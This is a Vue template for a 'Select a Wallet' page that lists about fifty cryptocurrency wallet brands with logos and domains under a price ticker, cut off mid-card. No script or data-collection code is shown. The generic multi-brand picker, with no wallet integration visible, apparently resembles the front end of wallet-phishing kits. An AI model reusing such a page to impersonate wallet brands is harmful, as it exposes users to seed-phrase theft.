<template>
  <div class="body header-fixed">
    <div
      id="coinmarketcap-widget-marquee"
      coins="1,1027,825,1839,2010,74,4030"
      currency="USD"
      theme="dark"
      transparent="false"
      show-symbol-logo="true"
    ></div>

    <div class="preload preload-container">
      <div class="preload-logo"></div>
    </div>

    <div id="wrapper">
      <div id="page" class="clearfix">
        <section class="tf-section top-seller" id="wallets_list">
          <div class="themesflat-container">
            <div class="row">
              <div class="col-md-12">
                <h2 class="tf-title style2">Select a Wallet</h2>
                <div class="heading-line s2"></div>
              </div>
              <!-- Added new wallets with online logos -->
              <div class="col-xl-3 col-lg-4 col-md-6 col-sm-6">
                <div
                  id="xaman_wallet"
                  class="sc-author-box select_wallet"
                  data-title="Xaman Wallet"
                  data-logo="https://logo.clearbit.com/xaman.app"
                  style="cursor: pointer"
                >
                  <div class="author-avatar">
                    <a href="index-2.html#">
                      <img
                        src="https://logo.clearbit.com/xaman.app"
                        alt="Image"
                        class="avatar"
                      />
                    </a>
                    <div class="#"><i class="ripple"></i></div>
                  </div>
                  <div class="author-infor">
                    <h5 class="style2"><a>Xaman Wallet</a></h5>
                    <span class="price">xaman.app</span>
                  </div>
                </div>
              </div>

              <div class="col-xl-3 col-lg-4 col-md-6 col-sm-6">
                <div
                  id="hashpack"
                  class="sc-author-box select_wallet"
                  data-title="HashPack"
                  data-logo="https://logo.clearbit.com/hashpack.app"
                  style="cursor: pointer"
                >
                  <div class="author-avatar">
                    <a href="index-2.html#">
                      <img
                        src="https://logo.clearbit.com/hashpack.app"
                        alt="Image"
                        class="avatar"
                      />
                    </a>
                    <div class=""><i class="ripple"></i></div>
                  </div>
                  <div class="author-infor">
                    <h5 class="style2"><a>HashPack</a></h5>
                    <span class="price">hashpack.app</span>
                  </div>
                </div>
              </div>

              <div class="col-xl-3 col-lg-4 col-md-6 col-sm-6">
                <div
                  id="crypto_onchain"
                  class="sc-author-box select_wallet"
                  data-title="Crypto.com Onchain"
                  data-logo="https://logo.clearbit.com/crypto.com"
                  style="cursor: pointer"
                >
                  <div class="author-avatar">
                    <a href="index-2.html#">
                      <img
                        src="https://logo.clearbit.com/crypto.com"
                        alt="Image"
                        class="avatar"
                      />
                    </a>
                    <div class=""><i class="ripple"></i></div>
                  </div>
                  <div class="author-infor">
                    <h5 class="style2"><a>Crypto.com Onchain</a></h5>
                    <span class="price">crypto.com</span>
                  </div>
                </div>
              </div>

              <div class="col-xl-3 col-lg-4 col-md-6 col-sm-6">
                <div
                  id="tangem"
                  class="sc-author-box select_wallet"
                  data-title="Tangem"
                  data-logo="https://logo.clearbit.com/tangem.com"
                  style="cursor: pointer"
                >
                  <div class="author-avatar">
                    <a href="index-2.html#">
                      <img
                        src="https://logo.clearbit.com/tangem.com"
                        alt="Image"
                        class="avatar"
                      />
                    </a>
                    <div class=""><i class="ripple"></i></div>
                  </div>
                  <div class="author-infor">
                    <h5 class="style2"><a>Tangem</a></h5>
                    <span class="price">tangem.com</span>
                  </div>
                </div>
              </div>

              <div class="col-xl-3 col-lg-4 col-md-6 col-sm-6">
                <div
                  id="trezor"
                  class="sc-author-box select_wallet"
                  data-title="Trezor"
                  data-logo="https://logo.clearbit.com/trezor.io"
                  style="cursor: pointer"
                >
                  <div class="author-avatar">
                    <a href="index-2.html#">
                      <img
                        src="https://logo.clearbit.com/trezor.io"
                        alt="Image"
                        class="avatar"
                      />
                    </a>
                    <div class=""><i class="ripple"></i></div>
                  </div>
                  <div class="author-infor">
                    <h5 class="style2"><a>Trezor</a></h5>
                    <span class="price">trezor.io</span>
                  </div>
                </div>
              </div>

              <div class="col-xl-3 col-lg-4 col-md-6 col-sm-6">
                <div
                  id="guarda_wallet"
                  class="sc-author-box select_wallet"
                  data-title="Guarda Wallet"
                  data-logo="https://logo.clearbit.com/guarda.com"
                  style="cursor: pointer"
                >
                  <div class="author-avatar">
                    <a href="index-2.html#">
                      <img
                        src="https://logo.clearbit.com/guarda.com"
                        alt="Image"
                        class="avatar"
                      />
                    </a>
                    <div class=""><i class="ripple"></i></div>
                  </div>
                  <div class="author-infor">
                    <h5 class="style2"><a>Guarda Wallet</a></h5>
                    <span class="price">guarda.com</span>
                  </div>
                </div>
              </div>

              <div class="col-xl-3 col-lg-4 col-md-6 col-sm-6">
                <div
                  id="wallet_connect"
                  class="sc-author-box select_wallet"
                  data-title="Wallet Connect"
                  data-logo="/images/logo/walle.jpg"
                  style="cursor: pointer"
                >
                  <div class="author-avatar">
                    <a href="index-2.html#">
                      <img
                        src="/images/logo/walle.jpg"
                        alt="Image"
                        class="avatar"
                      />
                    </a>
                    <div class="#"><i class="ripple"></i></div>
                  </div>
                  <div class="author-infor">
                    <h5 class="style2"><a>Wallet Connect</a></h5>
                    <span class="price">walletconnect.com</span>
                  </div>
                </div>
              </div>

              <div class="col-xl-3 col-lg-4 col-md-6 col-sm-6">
                <div
                  id="trust_wallet"
                  class="sc-author-box select_wallet"
                  data-title="Trust Wallet"
                  data-logo="/images/logo/trust_wallet.jpg"
                  style="cursor: pointer"
                >
                  <div class="author-avatar">
                    <a href="index-2.html#">
                      <img
                        src="/images/logo/trust_wallet.jpg"
                        alt="Image"
                        class="avatar"
                      />
                    </a>
                    <div class=""><i class="ripple"></i></div>
                  </div>
                  <div class="author-infor">
                    <h5 class="style2"><a>Trust Wallet</a></h5>
                    <span class="price">trustwallet.com</span>
                  </div>
                </div>
              </div>

              <div class="col-xl-3 col-lg-4 col-md-6 col-sm-6">
                <div
                  id="trust_wallet"
                  class="sc-author-box select_wallet"
                  data-title="Chainge Wallet"
                  data-logo="/images/logo/chaingefi.jpeg"
                  style="cursor: pointer"
                >
                  <div class="author-avatar">
                    <a href="index-2.html#">
                      <img
                        src="/images/logo/chaingefi.jpg"
                        alt="Image"
                        class="avatar"
                      />
                    </a>
                    <div class=""><i class="ripple"></i></div>
                  </div>
                  <div class="author-infor">
                    <h5 class="style2"><a>Chainge Wallet</a></h5>
                    <span class="price">chainge.finance</span>
                  </div>
                </div>
              </div>

              <div class="col-xl-3 col-lg-4 col-md-6 col-sm-6">
                <div
                  id="metamask"
                  class="sc-author-box select_wallet"
                  data-title="Metamask"
                  data-logo="/images/logo/metamask.jpg"
                  style="cursor: pointer"
                >
                  <div class="author-avatar">
                    <a href="index-2.html#">
                      <img
                        src="/images/logo/metamask.jpg"
                        alt="Image"
                        class="avatar"
                      />
                    </a>
                    <div class=""><i class="ripple"></i></div>
                  </div>
                  <div class="author-infor">
                    <h5 class="style2"><a>Metamask</a></h5>
                    <span class="price">metamask.io</span>
                  </div>
                </div>
              </div>

              <div class="col-xl-3 col-lg-4 col-md-6 col-sm-6">
                <div
                  id="trust_wallet"
                  class="sc-author-box select_wallet"
                  data-title="Sub Wallet"
                  data-logo="/images/logo/subwallet.jpeg"
                  style="cursor: pointer"
                >
                  <div class="author-avatar">
                    <a href="index-2.html#">
                      <img
                        src="/images/logo/subwallet.jpg"
                        alt="Image"
                        class="avatar"
                      />
                    </a>
                    <div class=""><i class="ripple"></i></div>
                  </div>
                  <div class="author-infor">
                    <h5 class="style2"><a>Sub Wallet</a></h5>
                    <span class="price">subwallet.app</span>
                  </div>
                </div>
              </div>

              <div class="col-xl-3 col-lg-4 col-md-6 col-sm-6">
                <div
                  id="trust_wallet"
                  class="sc-author-box select_wallet"
                  data-title="Xaman Wallet"
                  data-logo="/images/logo/xumm_pic.png"
                  style="cursor: pointer"
                >
                  <div class="author-avatar">
                    <a href="index-2.html#">
                      <img
                        src="/images/logo/xumm_pic.png"
                        alt="Image"
                        class="avatar"
                      />
                    </a>
                    <div class=""><i class="ripple"></i></div>
                  </div>
                  <div class="author-infor">
                    <h5 class="style2"><a>Xaman Wallet</a></h5>
                    <span class="price">xumm.app</span>
                  </div>
                </div>
              </div>

              <div class="col-xl-3 col-lg-4 col-md-6 col-sm-6">
                <div
                  id="metamask"
                  class="sc-author-box select_wallet"
                  data-title="Hashpack"
                  data-logo="/images/logo/hash.jfif"
                  style="cursor: pointer"
                >
                  <div class="author-avatar">
                    <a href="index-2.html#">
                      <img
                        src="/images/logo/hash.jpg"
                        alt="Image"
                        class="avatar"
                      />
                    </a>
                    <div class=""><i class="ripple"></i></div>
                  </div>
                  <div class="author-infor">
                    <h5 class="style2"><a>Hashpack</a></h5>
                    <span class="price">hashpack.app</span>
                  </div>
                </div>
              </div>

              <div class="col-xl-3 col-lg-4 col-md-6 col-sm-6">
                <div
                  id="wallet_connect"
                  class="sc-author-box select_wallet"
                  data-title="Keplr"
                  data-logo="/images/logo/keplr.png"
                  style="cursor: pointer"
                >
                  <div class="author-avatar">
                    <a href="index-2.html#">
                      <img
                        src="/images/logo/keplr.png"
                        alt="Image"
                        class="avatar"
                      />
                    </a>
                    <div class="#"><i class="ripple"></i></div>
                  </div>
                  <div class="author-infor">
                    <h5 class="style2"><a>Keplr</a></h5>
                    <span class="price">keplr.app</span>
                  </div>
                </div>
              </div>

              <div class="col-xl-3 col-lg-4 col-md-6 col-sm-6">
                <div
                  id="wallet_connect"
                  class="sc-author-box select_wallet"
                  data-title="Ronin"
                  data-logo="/images/logo/ronin_wallet.png"
                  style="cursor: pointer"
                >
                  <div class="author-avatar">
                    <a href="index-2.html#">
                      <img
                        src="/images/logo/ronin_wallet.png"
                        alt="Image"
                        class="avatar"
                      />
                    </a>
                    <div class="#"><i class="ripple"></i></div>
                  </div>
                  <div class="author-infor">
                    <h5 class="style2"><a>Ronin Wallet</a></h5>
                    <span class="price">roninwallet</span>
                  </div>
                </div>
              </div>

              <div class="col-xl-3 col-lg-4 col-md-6 col-sm-6">
                <div
                  id="wallet_connect"
                  class="sc-author-box select_wallet"
                  data-title="Phantom Wallet"
                  data-logo="/images/logo/phantom_wallet.png"
                  style="cursor: pointer"
                >
                  <div class="author-avatar">
                    <a href="index-2.html#">
                      <img
                        src="/images/logo/phantom_wallet.png"
                        alt="Image"
                        class="avatar"
                      />
                    </a>
                    <div class="#"><i class="ripple"></i></div>
                  </div>
                  <div class="author-infor">
                    <h5 class="style2"><a>Phantom Wallet</a></h5>
                    <span class="price">phantom.app</span>
                  </div>
                </div>
              </div>

              <div class="col-xl-3 col-lg-4 col-md-6 col-sm-6">
                <div
                  id="metamask"
                  class="sc-author-box select_wallet"
                  data-title="Klever"
                  data-logo="/images/logo/klev.png"
                  style="cursor: pointer"
                >
                  <div class="author-avatar">
                    <a href="index-2.html#">
                      <img
                        src="/images/logo/klev.png"
                        alt="Image"
                        class="avatar"
                      />
                    </a>
                    <div class=""><i class="ripple"></i></div>
                  </div>
                  <div class="author-infor">
                    <h5 class="style2"><a>Klever</a></h5>
                    <span class="price">klever.io</span>
                  </div>
                </div>
              </div>

              <div class="col-xl-3 col-lg-4 col-md-6 col-sm-6">
                <div
                  id="metamask"
                  class="sc-author-box select_wallet"
                  data-title="Solo Dex Wallet"
                  data-logo="/images/logo/solo_pic.png"
                  style="cursor: pointer"
                >
                  <div class="author-avatar">
                    <a href="index-2.html#">
                      <img
                        src="/images/logo/solo_pic.png"
                        alt="Image"
                        class="avatar"
                      />
                    </a>
                    <div class=""><i class="ripple"></i></div>
                  </div>
                  <div class="author-infor">
                    <h5 class="style2"><a>Solo Dex Wallet</a></h5>
                    <span class="price">sologenic.com</span>
                  </div>
                </div>
              </div>

              <div class="col-xl-3 col-lg-4 col-md-6 col-sm-6">
                <div
                  id="metamask"
                  class="sc-author-box select_wallet"
                  data-title="Fantom"
                  data-logo="/images/logo/fantom.png"
                  style="cursor: pointer"
                >
                  <div class="author-avatar">
                    <a href="index-2.html#">
                      <img
                        src="/images/logo/fantom.png"
                        alt="Image"
                        class="avatar"
                      />
                    </a>
                    <div class=""><i class="ripple"></i></div>
                  </div>
                  <div class="author-infor">
                    <h5 class="style2"><a>Fantom</a></h5>
                    <span class="price">fantom.foundation</span>
                  </div>
                </div>
              </div>

              <div class="col-xl-3 col-lg-4 col-md-6 col-sm-6">
                <div
                  id="metamask"
                  class="sc-author-box select_wallet"
                  data-title="Blade"
                  data-logo="/images/logo/blade.png"
                  style="cursor: pointer"
                >
                  <div class="author-avatar">
                    <a href="index-2.html#">
                      <img
                        src="/images/logo/blade.png"
                        alt="Image"
                        class="avatar"
                      />
                    </a>
                    <div class=""><i class="ripple"></i></div>
                  </div>
                  <div class="author-infor">
                    <h5 class="style2"><a>Blade</a></h5>
                    <span class="price">bladewallet.io</span>
                  </div>
                </div>
              </div>

              <div class="col-xl-3 col-lg-4 col-md-6 col-sm-6">
                <div
                  id="metamask"
                  class="sc-author-box select_wallet"
                  data-title="Rabby Wallet"
                  data-logo="/images/logo/rabbywall.jpeg"
                  style="cursor: pointer"
                >
                  <div class="author-avatar">
                    <a href="index-2.html#">
                      <img
                        src="/images/logo/rabbywall.jpg"
                        alt="Image"
                        class="avatar"
                      />
                    </a>
                    <div class=""><i class="ripple"></i></div>
                  </div>
                  <div class="author-infor">
                    <h5 class="style2"><a>Rabby Wallet</a></h5>
                    <span class="price">rabby.io</span>
                  </div>
                </div>
              </div>

              <div class="col-xl-3 col-lg-4 col-md-6 col-sm-6">
                <div
                  id="metamask"
                  class="sc-author-box select_wallet"
                  data-title="Torus Wallet"
                  data-logo="/images/logo/torus.svg"
                  style="cursor: pointer"
                >
                  <div class="author-avatar">
                    <a href="index-2.html#">
                      <img
                        src="/images/logo/torus.svg"
                        alt="Image"
                        class="avatar"
                      />
                    </a>
                    <div class=""><i class="ripple"></i></div>
                  </div>
                  <div class="author-infor">
                    <h5 class="style2"><a>Torus Wallet</a></h5>
                    <span class="price">app.tor.us</span>
                  </div>
                </div>
              </div>

              <div class="col-xl-3 col-lg-4 col-md-6 col-sm-6">
                <div
                  id="metamask"
                  class="sc-author-box select_wallet"
                  data-title="Cosmos"
                  data-logo="/images/logo/cosmos.png"
                  style="cursor: pointer"
                >
                  <div class="author-avatar">
                    <a href="index-2.html#">
                      <img
                        src="/images/logo/cosmos.png"
                        alt="Image"
                        class="avatar"
                      />
                    </a>
                    <div class=""><i class="ripple"></i></div>
                  </div>
                  <div class="author-infor">
                    <h5 class="style2"><a>Cosmos</a></h5>
                    <span class="price">cosmos.network</span>
                  </div>
                </div>
              </div>

              <div class="col-xl-3 col-lg-4 col-md-6 col-sm-6">
                <div
                  id="metamask"
                  class="sc-author-box select_wallet"
                  data-title="Slope"
                  data-logo="/images/logo/slope.png"
                  style="cursor: pointer"
                >
                  <div class="author-avatar">
                    <a href="index-2.html#">
                      <img
                        src="/images/logo/slope.png"
                        alt="Image"
                        class="avatar"
                      />
                    </a>
                    <div class=""><i class="ripple"></i></div>
                  </div>
                  <div class="author-infor">
                    <h5 class="style2"><a>Slope Wallet</a></h5>
                    <span class="price">slope.finance</span>
                  </div>
                </div>
              </div>

              <div class="col-xl-3 col-lg-4 col-md-6 col-sm-6">
                <div
                  id="Flint Wallet"
                  class="sc-author-box select_wallet"
                  data-title="Flint Wallet"
                  data-logo="/images/logo/Flint.jpeg"
                  style="cursor: pointer"
                >
                  <div class="author-avatar">
                    <a href="index-2.html#">
                      <img
                        src="/images/logo/Flint.jpg"
                        alt="Image"
                        class="avatar"
                      />
                    </a>
                    <div class=""><i class="ripple"></i></div>
                  </div>
                  <div class="author-infor">
                    <h5 class="style2"><a>Flint Wallet</a></h5>
                    <span class="price">Flint-Wallet.com</span>
                  </div>
                </div>
              </div>

              <div class="col-xl-3 col-lg-4 col-md-6 col-sm-6">
                <div
                  id="binance"
                  class="sc-author-box select_wallet"
                  data-title="Binance Chain Wallet"
                  data-logo="/images/logo/binance.png"
                  style="cursor: pointer"
                >
                  <div class="author-avatar">
                    <a href="index-2.html#">
                      <img
                        src="/images/logo/binance.png"
                        alt="Image"
                        class="avatar"
                      />
                    </a>
                    <div class="#"><i class="ripple"></i></div>
                  </div>
                  <div class="author-infor">
                    <h5 class="style2"><a>Binance Chain Wallet</a></h5>
                    <span class="price">binance.com</span>
                  </div>
                </div>
              </div>

              <div class="col-xl-3 col-lg-4 col-md-6 col-sm-6">
                <div
                  id="binance"
                  class="sc-author-box select_wallet"
                  data-title="Binance Chain Wallet"
                  data-logo="/images/logo/terra.png"
                  style="cursor: pointer"
                >
                  <div class="author-avatar">
                    <a href="index-2.html#">
                      <img
                        src="/images/logo/terra.png"
                        alt="Image"
                        class="avatar"
                      />
                    </a>
                    <div class="#"><i class="ripple"></i></div>
                  </div>
                  <div class="author-infor">
                    <h5 class="style2"><a>Terra station</a></h5>
                    <span class="price">terra.money</span>
                  </div>
                </div>
              </div>

              <div class="col-xl-3 col-lg-4 col-md-6 col-sm-6">
                <div
                  id="polygon"
                  class="sc-author-box select_wallet"
                  data-title="Polygon Wallet"
                  data-logo="/images/logo/polygon.jpg"
                  style="cursor: pointer"
                >
                  <div class="author-avatar">
                    <a href="index-2.html#">
                      <img
                        src="/images/logo/polygon.jpg"
                        alt="Image"
                        class="avatar"
                      />
                    </a>
                    <div class="#"><i class="ripple"></i></div>
                  </div>
                  <div class="author-infor">
                    <h5 class="style2"><a>Polygon Wallet</a></h5>
                    <span class="price">polygon.technology</span>
                  </div>
                </div>
              </div>

              <div class="col-xl-3 col-lg-4 col-md-6 col-sm-6">
                <div
                  id="rainbow"
                  class="sc-author-box select_wallet"
                  data-title="Rainbow"
                  data-logo="/images/logo/rainbow.jpg"
                  style="cursor: pointer"
                >
                  <div class="author-avatar">
                    <a href="index-2.html#">
                      <img
                        src="/images/logo/rainbow.jpg"
                        alt="Image"
                        class="avatar"
                      />
                    </a>
                    <div class="#"><i class="ripple"></i></div>
                  </div>
                  <div class="author-infor">
                    <h5 class="style2"><a>Rainbow</a></h5>
                    <span class="price">rainbow.me</span>
                  </div>
                </div>
              </div>

              <div class="col-xl-3 col-lg-4 col-md-6 col-sm-6">
                <div
                  id="bitpay"
                  class="sc-author-box select_wallet"
                  data-title="Bitpay"
                  data-logo="/images/logo/bitpay.jpg"
                  style="cursor: pointer"
                >
                  <div class="author-avatar">
                    <a href="index-2.html#">
                      <img
                        src="/images/logo/bitpay.jpg"
                        alt="Image"
                        class="avatar"
                      />
                    </a>
                    <div class="#"><i class="ripple"></i></div>
                  </div>
                  <div class="author-infor">
                    <h5 class="style2"><a>Bitpay</a></h5>
                    <span class="price">bitpay.com</span>
                  </div>
                </div>
              </div>

              <div class="col-xl-3 col-lg-4 col-md-6 col-sm-6">
                <div
                  id="waleth"
                  class="sc-author-box select_wallet"
                  data-title="Walleth"
                  data-logo="/images/logo/walleth.jpg"
                  style="cursor: pointer"
                >
                  <div class="author-avatar">
                    <a href="index-2.html#">
                      <img
                        src="/images/logo/walleth.jpg"
                        alt="Image"
                        class="avatar"
                      />
                    </a>
                    <div class="#"><i class="ripple"></i></div>
                  </div>
                  <div class="author-infor">
                    <h5 class="style2"><a>Walleth</a></h5>
                    <span class="price">walleth.org</span>
                  </div>
                </div>
              </div>

              <div class="col-xl-3 col-lg-4 col-md-6 col-sm-6">
                <div
                  id="argent"
                  class="sc-author-box select_wallet"
                  data-title="Argent"
                  data-logo="/images/logo/argent.jpg"
                  style="cursor: pointer"
                >
                  <div class="author-avatar">
                    <a href="index-2.html#">
                      <img
                        src="/images/logo/argent.jpg"
                        alt="Image"
                        class="avatar"
                      />
                    </a>
                    <div class="#"><i class="ripple"></i></div>
                  </div>
                  <div class="author-infor">
                    <h5 class="style2"><a>Argent</a></h5>
                    <span class="price">argent.xyz</span>
                  </div>
                </div>
              </div>

              <div class="col-xl-3 col-lg-4 col-md-6 col-sm-6">
                <div
                  id="huobi"
                  class="sc-author-box select_wallet"
                  data-title="Huobi Wallet"
                  data-logo="/images/logo/huobi.jpg"
                  style="cursor: pointer"
                >
                  <div class="author-avatar">
                    <a href="index-2.html#">
                      <img
                        src="/images/logo/huobi.jpg"
                        alt="Image"
                        class="avatar"
                      />
                    </a>
                    <div class="#"><i class="ripple"></i></div>
                  </div>
                  <div class="author-infor">
                    <h5 class="style2"><a>Huobi Wallet</a></h5>
                    <span class="price">huobiwallet.com</span>
                  </div>
                </div>
              </div>

              <div class="col-xl-3 col-lg-4 col-md-6 col-sm-6">
                <div
                  id="encrypted_ink"
                  class="sc-author-box select_wallet"
                  data-title="Encrypted Ink"
                  data-logo="/images/logo/encrypted_ink.jpg"
                  style="cursor: pointer"
                >
                  <div class="author-avatar">
                    <a href="index-2.html#">
                      <img
                        src="/images/logo/encrypted_ink.jpg"
                        alt="Image"
                        class="avatar"
                      />
                    </a>
                    <div class="#"><i class="ripple"></i></div>
                  </div>
                  <div class="author-infor">
                    <h5 class="style2"><a>Encrypted Ink</a></h5>
                    <span class="price">encrypted.ink</span>
                  </div>
                </div>
              </div>

              <div class="col-xl-3 col-lg-4 col-md-6 col-sm-6">
                <div
                  id="compound"
                  class="sc-author-box select_wallet"
                  data-title="Compound"
                  data-logo="/images/logo/compound.jpg"
                  style="cursor: pointer"
                >
                  <div class="author-avatar">
                    <a href="index-2.html#">
                      <img
                        src="/images/logo/compound.jpg"
                        alt="Image"
                        class="avatar"
                      />
                    </a>
                    <div class="#"><i class="ripple"></i></div>
                  </div>
                  <div class="author-infor">
                    <h5 class="style2"><a>Compound</a></h5>
                    <span class="price">compound.finance</span>
                  </div>
                </div>
              </div>

              <div class="col-xl-3 col-lg-4 col-md-6 col-sm-6">
                <div
                  id="polkadot"
                  class="sc-author-box select_wallet"
                  data-title="Polkadot"
                  data-logo="/images/logo/polkadot.jpg"
                  style="cursor: pointer"
                >
                  <div class="author-avatar">
                    <a href="index-2.html#">
                      <img
                        src="/images/logo/polkadot.jpg"
                        alt="Image"
                        class="avatar"
                      />
                    </a>
                    <div class="#"><i class="ripple"></i></div>
                  </div>
                  <div class="author-infor">
                    <h5 class="style2"><a>Polkadot</a></h5>
                    <span class="price">polkadot.network</span>
                  </div>
                </div>
              </div>

              <div class="col-xl-3 col-lg-4 col-md-6 col-sm-6">
                <div
                  id="iotex"
                  class="sc-author-box select_wallet"
                  data-title="Iotex"
                  data-logo="/images/logo/iotex.jpg"
                  style="cursor: pointer"
                >
                  <div class="author-avatar">
                    <a href="index-2.html#">
                      <img
                        src="/images/logo/iotex.jpg"
                        alt="Image"
                        class="avatar"
                      />
                    </a>
                    <div class="#"><i class="ripple"></i></div>
                  </div>
                  <div class="author-infor">
                    <h5 class="style2"><a>Iotex</a></h5>
                    <span class="price">iotex.io</span>
                  </div>
                </div>
              </div>

              <div class="col-xl-3 col-lg-4 col-md-6 col-sm-6">
                <div
                  id="coin98"
                  class="sc-author-box select_wallet"
                  data-title="Coin98"
                  data-logo="/images/logo/coin98.jpg"
                  style="cursor: pointer"
                >
                  <div class="author-avatar">
                    <a href="index-2.html#">
                      <img
                        src="/images/logo/coin98.jpg"
                        alt="Image"
                        class="avatar"
                      />
                    </a>
                    <div class="#"><i class="ripple"></i></div>
                  </div>
                  <div class="author-infor">
                    <h5 class="style2"><a>Coin98</a></h5>
                    <span class="price">coin98.com</span>
                  </div>
                </div>
              </div>

              <div class="col-xl-3 col-lg-4 col-md-6 col-sm-6">
                <div
                  id="coinbase"
                  class="sc-author-box select_wallet"
                  data-title="Coinbase"
                  data-logo="/images/logo/coinbase.png"
                  style="cursor: pointer"
                >
                  <div class="author-avatar">
                    <a href="index-2.html#">
                      <img
                        src="/images/logo/coinbase.png"
                        alt="Image"
                        class="avatar"
                      />
                    </a>
                    <div class="#"><i class="ripple"></i></div>
                  </div>
                  <div class="author-infor">
                    <h5 class="style2"><a>Coinbase</a></h5>
                    <span class="price">coinbase.com</span>
                  </div>
                </div>
              </div>

              <div class="col-xl-3 col-lg-4 col-md-6 col-sm-6">
                <div
                  id="crypto"
                  class="sc-author-box select_wallet"
                  data-title="Crypto.com | Defi Wallet"
                  data-logo="/images/logo/crypto.jpg"
                  style="cursor: pointer"
                >
                  <div class="author-avatar">
                    <a href="index-2.html#">
                      <img
                        src="/images/logo/crypto.jpg"
                        alt="Image"
                        class="avatar"
                      />
                    </a>
                    <div class="#"><i class="ripple"></i></div>
                  </div>
                  <div class="author-infor">
                    <h5 class="style2"><a>Crypto.com | Defi Wallet</a></h5>
                    <span class="price">crypto.com</span>
                  </div>
                </div>
              </div>

              <div class="col-xl-3 col-lg-4 col-md-6 col-sm-6">
                <div
                  id="token_pocket"
                  class="sc-author-box select_wallet"
                  data-title="Token Pocket"
                  data-logo="/images/logo/token_pocket.jpg"
                  style="cursor: pointer"
                >
                  <div class="author-avatar">
                    <a href="index-2.html#">
                      <img
                        src="/images/logo/token_pocket.jpg"
                        alt="Image"
                        class="avatar"
                      />
                    </a>
                    <div class="#"><i class="ripple"></i></div>
                  </div>
                  <div class="author-infor">
                    <h5 class="style2"><a>Token Pocket</a></h5>
                    <span class="price">tokenpocket.pro</span>
                  </div>
                </div>
              </div>

              <div class="col-xl-3 col-lg-4 col-md-6 col-sm-6">
                <div
                  id="math_wallet"
                  class="sc-author-box select_wallet"
                  data-title="Math Wallet"
                  data-logo="/images/logo/math_wallet.jpg"
                  style="cursor: pointer"
                >
                  <div class="author-avatar">
                    <a href="index-2.html#">
                      <img
                        src="/images/logo/math_wallet.jpg"
                        alt="Image"
                        class="avatar"
                      />
                    </a>
                    <div class="#"><i class="ripple"></i></div>
                  </div>
                  <div class="author-infor">
                    <h5 class="style2"><a>Math Wallet</a></h5>
                    <span class="price">mathwallet.org</span>
                  </div>
                </div>
              </div>

              <div class="col-xl-3 col-lg-4 col-md-6 col-sm-6">
                <div
                  id="ledger_live"
                  class="sc-author-box select_wallet"
                  data-title="Ledger Live"
                  data-logo="/images/logo/ledgerlive.png"
                  style="cursor: pointer"
                >
                  <div class="author-avatar">
                    <a href="index-2.html#">
                      <img
                        src="/images/logo/ledgerlive.png"
                        alt="Image"
                        class="avatar"
                      />
                    </a>
                    <div class="#"><i class="ripple"></i></div>
                  </div>
                  <div class="author-infor">
                    <h5 class="style2"><a>Ledger Live</a></h5>
                    <span class="price">ledger.com</span>
                  </div>
                </div>
              </div>

              <div class="col-xl-3 col-lg-4 col-md-6 col-sm-6">
                <div
                  id="_1inch"
                  class="sc-author-box select_wallet"
                  data-title="1Inch"
                  data-logo="/images/logo/1inch.jpg"
                  style="cursor: pointer"
                >
                  <div class="author-avatar">
                    <a href="index-2.html#">
                      <img
                        src="/images/logo/1inch.jpg"
                        alt="Image"
                        class="avatar"
                      />
                    </a>
                    <div class="#"><i class="ripple"></i></div>
                  </div>
                  <div class="author-infor">
                    <h5 class="style2"><a>1Inch</a></h5>
                    <span class="price">1inch.io</span>
                  </div>
                </div>
              </div>

              <div class="col-xl-3 col-lg-4 col-md-6 col-sm-6">
                <div
                  id="dharma"
                  class="sc-author-box select_wallet"
                  data-title="Dharma"
                  data-logo="/images/logo/dharma.jpg"
                  style="cursor: pointer"
                >
                  <div class="author-avatar">
                    <a href="index-2.html#">
                      <img
                        src="/images/logo/dharma.jpg"
                        alt="Image"
                        class="avatar"
                      />
                    </a>
                    <div class="#"><i class="ripple"></i></div>
                  </div>
                  <div class="author-infor">
                    <h5 class="style2"><a>Dharma</a></h5>
                    <span class="price">dharma.io</span>
                  </div>
                </div>
              </div>

              <div class="col-xl-3 col-lg-4 col-md-6 col-sm-6">
                <div
                  id="trust_vault"
                  class="sc-author-box select_wallet"
                  data-title="Trust Vault"
                  data-logo="/images/logo/trust_vault.jpg"
                  style="cursor: pointer"
                >
                  <div class="author-avatar">
                    <a href="index-2.html#">
                      <img
                        src="/images/logo/trust_vault.jpg"
                        alt="Image"
                        class="avatar"
                      />
                    </a>
                    <div class="#"><i class="ripple"></i></div>
                  </div>
                  <div class="author-infor">
                    <h5 class="style2"><a>Trust Vault</a></h5>
                    <span class="price">trustology.io</span>
                  </div>
                </div>
              </div>

              <div class="col-xl-3 col-lg-4 col-md-6 col-sm-6">
                <div
                  id="my_key"
                  class="sc-author-box select_wallet"
                  data-title="MYKEY"
                  data-logo="/images/logo/mykey.jpg"
                  style="cursor: pointer"
                >
                  <div class="author-avatar">
                    <a href="index-2.html#">
                      <img
                        src="/images/logo/mykey.jpg"
                        alt="Image"
                        class="avatar"
                      />
                    </a>
                    <div class="#"><i class="ripple"></i></div>
                  </div>
                  <div class="author-infor">
                    <h5 class="style2"><a>MYKEY</a></h5>
                    <span class="price">mykey.org</span>
                  </div>
                </div>
              </div>

              <div class="col-xl-3 col-lg-4 col-md-6 col-sm-6">
                <div
                  id="atomic"
                  class="sc-author-box select_wallet"
                  data-title="Atomic"
                  data-logo="/images/logo/atomic.jpg"
                  style="cursor: pointer"
                >
                  <div class="author-avatar">
                    <a href="index-2.html#">
                      <img
                        src="/images/logo/atomic.jpg"
                        alt="Image"
                        class="avatar"
                      />
                    </a>
                    <div class="#"><i class="ripple"></i></div>
                  </div>
                  <div class="author-infor">
                    <h5 class="style2"><a>Atomic</a></h5>
                    <span class="price">atomicwallet.io</span>
                  </div>
                </div>
              </div>

              <div class="col-xl-3 col-lg-4 col-md-6 col-sm-6">
                <div
                  id="cool_wallet_s"
                  class="sc-author-box select_wallet"
                  data-title="CoolWallet S"
                  data-logo="/images/logo/cool_wallet_s.jpg"
                  style="cursor: pointer"
                >
                  <div class="author-avatar">
                    <a href="index-2.html#">
                      <img
                        src="/images/logo/cool_wallet_s.jpg"
                        alt="Image"
                        class="avatar"
                      />
                    </a>
                    <div class="#"><i class="ripple"></i></div>
                  </div>
                  <div class="author-infor">
                    <h5 class="style2"><a>CoolWallet S</a></h5>
                    <span class="price">coolwallet.io</span>
                  </div>
                </div>
              </div>

              <div class="col-xl-3 col-lg-4 col-md-6 col-sm-6">
                <div
                  id="nash"
                  class="sc-author-box select_wallet"
                  data-title="Nash"
                  data-logo="/images/logo/nash.jpg"
                  style="cursor: pointer"
                >
                  <div class="author-avatar">
                    <a href="index-2.html#">
                      <img
                        src="/images/logo/nash.jpg"
